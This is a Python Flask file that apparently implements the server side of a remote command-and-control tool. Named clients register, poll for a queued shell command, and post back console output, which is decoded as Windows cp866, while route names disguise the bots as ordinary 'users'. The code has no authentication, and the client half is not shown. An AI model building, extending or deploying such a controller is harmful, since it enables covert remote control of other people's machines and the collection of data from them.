import time

from flask import Flask, request
import socket
import time


app = Flask(__name__)
users = {}


@app.route('/users', methods=['GET'])
def user():
    return users


@app.route('/users/<name>', methods=['GET'])
def list_users(name):
    return f'salam! {name}'


@app.route('/users/<name>/command', methods=['GET', 'POST'])
def command(name):
    if request.method == 'POST':
        users[name]['cmd'] = request.form['cmd']
        if users[name]['cmd'] == 'clear':
            users[name]['out'] = ''
        else:
            users[name]['out'] += users[name]['cmd'] + '<br/>'
    return users[name]['cmd']


@app.route('/users/<name>/output', methods=['GET', 'POST'])
def output(name):
    if request.method == 'POST':
        req = request.form['out'].encode('cp1251').decode('cp866')
        req = req.replace("\n", "<br/>")
        if req != '':
            users[name]['out'] += req + '<br/>' + '-' * 600 + '<br/>'
    return users[name]['out']


@app.route('/users/<name>/clear', methods=['GET'])
def clear(name):
    users[name]['cmd'] = ''
    return "Command cleared"


@app.route("/new_user", methods=['GET', 'POST'])
def new_user():
    name = request.form['name']
    if name not in users:
        users[name] = {'out': '', 'cmd': '', 'online': True}
    return "new guy joined!!!"


@app.route('/users/<name>/online', methods=['GET'])
def online(name):
    users[name]['online'] = True
    return users[name]['online']


@app.route('/users/<name>/offline', methods=['GET'])
def offline(name):
    users[name]['online'] = False
    return users[name]['online']


if __name__ == '__main__':
    app.run()
